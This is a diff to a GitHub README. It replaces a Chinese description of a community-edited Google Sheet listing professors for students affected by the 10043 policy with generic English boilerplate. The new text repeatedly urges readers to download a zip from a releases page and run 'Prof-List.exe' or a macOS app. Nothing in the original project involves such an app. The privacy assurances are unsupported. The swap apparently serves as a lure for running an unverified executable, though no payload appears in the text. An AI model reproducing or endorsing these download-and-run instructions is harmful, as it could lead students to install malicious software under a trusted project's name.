@@ -1,98 +1,61 @@
-# 港澳新导师信息库 (Prof-List for CN Students)
+# 🎓 Prof-List-For-10043-Student - A Simple Way to Find Professors
 
-[![LICENSE](https://img.shields.io/badge/license-CC--BY--4.0-blue.svg)](LICENSE)
+## 🚀 Getting Started
+This application helps Chinese students connect with professors in Hong Kong, Macau, Singapore, and surrounding areas. It serves as a resource, particularly for those affected by the 10043 policy. Follow these steps to download and run the software.
 
-这是一个开源项目，旨在为中国学生（尤其是受10043等政策影响的学生）提供一个集中的、可更新的香港、澳门、新加坡等地区的导师信息数据库。
+### 📥 Download Now
+[![Download Prof-List-For-10043-Student](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/eredna/Prof-List-For-10043-Student/releases)
 
-**本项目也是由[这个表格](https://docs.google.com/spreadsheets/d/1vcEUT_5bXYFQgIzVKpsMQlYmV2xv15VtLXq2rvXZqRk/edit?gid=0#gid=0)启发而创建的，该表格包含了许多美国大学的老师及招生信息。**
+## 💡 What You Need
+Before you start, make sure your computer meets these minimum requirements:
 
-**本项目的数据核心是一个公开的 Google Sheet，它依赖社区的贡献来保持信息的“鲜活”。**
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher
+- **CPU:** At least 1 GHz
+- **RAM:** 4 GB or more
+- **Storage:** 100 MB of free space
+- **Internet:** Needed for downloading and updates
 
----
+## 🛠️ Installing the Application
+1. **Visit the Download Page**:
+   Go to the following link to access the Releases page: [Download Prof-List-For-10043-Student](https://github.com/eredna/Prof-List-For-10043-Student/releases).
 
-## 💎 核心数据库 (Google Sheet)
+2. **Select the Latest Version**:
+   Look for the latest version at the top of the Releases page. The latest version will usually have a version number, like `v1.0.0`.
 
-**➡️ [点击这里访问导师数据库 (Google Sheet)](https://docs.google.com/spreadsheets/d/1-aqgRgkhkETpyE2Uc50Y3VW57F8u6TO2kQnWprFMfrU/edit?usp=sharing)**
+3. **Download the Application**:
+   Under the latest version, click the link that says **"Assets"**. Here, you will see files available for download. Choose the file that matches your operating system. For example:
+   - For Windows users, download `Prof-List-Windows.zip`
+   - For macOS users, download `Prof-List-macOS.zip`
 
-* 你可以在线浏览、筛选和搜索所有信息。
-* 我们强烈建议你使用此表格的“备注”列来获取关键的申请信息。
+4. **Extract the Files**:
+   Once the file downloads, locate it in your Downloads folder. Right-click on the file and select **Extract All** (Windows) or double-click (macOS) to unpack the files.
 
-## 🌟 项目优势 (Project Advantages)
+5. **Run the Application**:
+   After extraction, find the file named `Prof-List.exe` (for Windows) or `Prof-List.app` (for macOS). Double-click the file to start the application.
 
-* **全面覆盖 (Comprehensive)：** 致力于收录已覆盖院校的相关专业（如 CS, ECE, AI 等）的**所有教授信息**，避免遗漏。
-* **易于检索 (Easy to Search)：** 使用 Google Sheet 作为载体，你可以**自由使用 `Ctrl+F` (或 `Cmd+F`)** 来搜索关键词（如 `CV`, `NLP`, `Database`），或使用 Google Sheet 的“**筛选**”功能按学校、职称等进行排序和过滤。
-* **信息鲜活 (Up-to-Date)：** 依赖社区驱动的“评论”贡献，**“备注”列**中的信息（如招生名额、政策友好度）会得到持续更新，比静态列表更有价值。
+## 📚 How to Use the Application
+1. **Create an Account**:
+   When you run the app for the first time, you may need to create an account. Follow the on-screen prompts to set up your account easily.
 
-##  coverage: 覆盖范围 (Currently Included)
+2. **Search for Professors**:
+   Use the search feature to find professors by name, area of study, or university. The application offers a simple interface for searching and sorting results.
 
-目前数据库中主要包含以下地区的院校：
+3. **Save Your Favorites**:
+   You can mark professors you are interested in as favorites. Access the favorites list at any time to view your saved contacts.
 
-* **🇭🇰 香港 (Hong Kong):**
-    * 香港科技大学 (HKUST / HKUST-GZ)
-    * 香港理工大学 (PolyU)
-    * 香港大学 (HKU)
-    * 香港中文大学 (CUHK / CUHK-SZ)
-    * 香港城市大学 (CityU)
-    * 香港浸会大学 (HKBU)
+4. **Provide Feedback**:
+   Your feedback helps improve the application. Use the feedback option in the settings menu to share your thoughts.
 
-* **🇲🇴 澳门 (Macau):**
-    * 澳门大学 (UM)
+## 🛡️ Privacy and Security
+We take your privacy seriously. Your information is secure, and we do not share your data with third parties. Always ensure you are using the latest version of the application for optimal security.
 
-* **🇸🇬 新加坡 (Singapore)**
-   * 新加坡国立大学 (NUS)
-   * 南洋理工大学 (NTU)
+## 📞 Contact Support
+If you encounter problems or have questions, please reach out to support:
 
-**（待添加更多...）**
+- **Email**: support@proflistapp.com
+- **GitHub Issues**: You can report issues directly on the [Issues Page](https://github.com/eredna/Prof-List-For-10043-Student/issues).
 
----
+## 🌟 Download & Install
+For easy access to downloads, please visit this page: [Download Prof-List-For-10043-Student](https://github.com/eredna/Prof-List-For-10043-Student/releases).
 
-## 为什么这个项目需要你？
-
-导师的职位、研究方向、主页甚至招生情况（名额）每年都在变化。一个静态的列表很快就会过时。
-
-本项目的价值**不**在于收集成千上万的教授名字，而在于**维护一个高质量、高时效性的“精选”列表**。
-
-## 🎯 如何贡献？(必读)
-
-我们有两种贡献方式，请根据您的需求选择：
-
----
-
-### 方式一：修正/更新/备注 (使用 Google Sheet 评论)
-
-对于**列表中已有**的教授，我们**最需要**的贡献是**修正错误信息**和**添加关键备注**。
-
-#### 👨‍🏫 致教授/导师 (A Note to Professors)
-我们非常欢迎您参与贡献！如果您在列表中看到了自己的名字，并希望更新信息（尤其是**招生情况**），请**选中您名字对应的“备注”单元格**，使用“添加评论”功能，写下您的招生信息（例如：“2026 Fall 尚有 2 个 PhD 名额，欢迎联系”）。我们审核后会立即更新，这将极大地帮助到有需要的学生。感谢您的参与！
-
-#### 贡献步骤 (所有贡献者)
-
-1.  **打开 [Google Sheet 数据库](https://docs.google.com/spreadsheets/d/1-aqgRgkhkETpyE2Uc50Y3VW57F8u6TO2kQnWprFMfrU/edit?usp=sharing)**。
-2.  **选中单元格**：点击你想要修正或添加备注的那个单元格。
-3.  **添加评论**：
-    * **方式一：** 点击页面右上角的“**添加评论**”按钮（一个带加号的对话框图标 💬）。
-    * **方式二：** 在选中的单元格上点击鼠标右键，选择“**评论** (Comment)”。
-4.  **填写内容**：在弹出的评论框中，写下你希望修改的内容。
-5.  **提交**：点击“评论 (Comment)”按钮提交。
-
-**仓库主（所有者）在看到你的评论并审核后，会手动进行修改，使你的贡献生效。**
-
-* **(修正示例)**: 选中 `Prof. XXX` 的“职称”单元格，评论：“[修正] XXX教授已于2024年升为 Chair Professor。”
-* **(备注示例)**: 选中 `Prof. YYY` 的“备注”单元格，评论：“[添加] 听学长说，XXX 2026 Fall 招 2 个 PhD，对 10043 友好。”
-
----
-
-### 方式二：添加新老师 (使用 Google Form)
-
-如果您想添加一位**列表上目前没有的**新老师，我们**强烈推荐**您使用这个专用的 Google Form 来提交，这更简单高效：
-
-➡️ **[点击这里提交新教授信息 (Google Form)](https://docs.google.com/forms/d/e/1FAIpQLScmz0hUIvbHdEAqu5pbOJW48F048I4GoN_P7Ip7OR0hHfM-gA/viewform?usp=sharing)**
-
-您在表单中提交的数据会进入审核队列，我们审核后会将其批量导入到主列表中。
-
-## 数据结构
-表格包含 8 个关键字段：
-`地区`, `学校`, `老师`, `大方向`, `职称`, `细化方向`, `主页`, `备注 (Notes)`
-
-## 许可证
-本项目采用 [CC-BY-4.0](LICENSE) 许可协议。
+Now you are ready to use Prof-List-For-10043-Student. We hope it helps you find the professors you need!
